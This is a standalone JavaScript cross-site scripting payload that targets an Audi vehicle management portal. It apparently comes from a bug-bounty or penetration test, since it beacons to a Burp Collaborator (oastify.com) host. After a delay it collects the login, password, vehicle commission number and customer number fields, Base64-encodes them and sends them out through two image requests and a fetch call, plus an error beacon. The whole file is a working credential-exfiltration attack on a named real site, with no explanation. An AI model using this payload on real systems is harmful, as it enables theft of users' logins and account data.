(function() {
    // Wait for page to fully load
    setTimeout(() => {
        try {
            let data = {
                fake_username: document.querySelector('input[name="fake_username"]')?.value || '',
                fake_password: document.querySelector('input[name="fake_password"]')?.value || '',
                commission_number: document.querySelector('input[name="_com_audi_mna_VehicleManagementPortlet_vehicleCommissionNumber"]')?.value || '',
                customer_number: document.querySelector('input[name="_com_audi_mna_VehicleManagementPortlet_vehicleCustomerNumber"]')?.value || '',
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
            
            // Base64 encode for safe transmission
            let payload = btoa(JSON.stringify(data));
            let collaborator = 'r7z6iqxtkro4lnr4yzhdr5skobu2itbh0.oastify.com';
            
            // Send via Image (most reliable for XSS)
            let img = new Image();
            img.src = 'https://' + collaborator + '/?data=' + payload;
            
            // Backup method - direct params (easier to read)
            let img2 = new Image();
            img2.src = 'https://' + collaborator + '/plain?user=' + 
                       encodeURIComponent(data.fake_username) + 
                       '&pass=' + encodeURIComponent(data.fake_password);
            
            // Third backup - fetch
            fetch('https://' + collaborator + '/fetch?data=' + payload, {
                method: 'GET',
                mode: 'no-cors'
            }).catch(e => {});
            
            console.log('[XSS] Data exfiltrated:', data);
            
        } catch(e) {
            // Send error info
            new Image().src = 'https://r7z6iqxtkro4lnr4yzhdr5skobu2itbh0.oastify.com/error?msg=' + 
                             encodeURIComponent(e.message);
        }
    }, 2000); // 2 second delay
})();
